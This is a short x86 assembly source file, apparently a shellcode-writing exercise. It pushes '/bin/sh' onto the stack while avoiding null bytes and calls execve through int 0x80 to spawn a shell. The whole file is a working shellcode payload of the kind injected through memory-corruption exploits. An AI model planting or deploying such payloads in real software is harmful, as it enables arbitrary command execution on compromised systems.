	# # # # # # # # # # # # # # # # # # # #
	# sh-push.s by Novice Live, http://novicelive.org :)
	#
	# feb 18, 2015
	# # # # # # # # # # # # # # # # # # # #
	
	.global _start
_start:
	xorl %eax, %eax
	pushl $0xff68732f # \0xff 'h' 's' '/'
	pushl $0x6e69622f # 'n' 'i' 'b' '/'
	movb %al, 7(%esp)
	# int execve(const char *filename, char *const argv[], char *const envp[]);
	movb $11, %al
	movl %esp, %ebx
	xorl %ecx, %ecx
	xorl %edx, %edx
	int $0x80
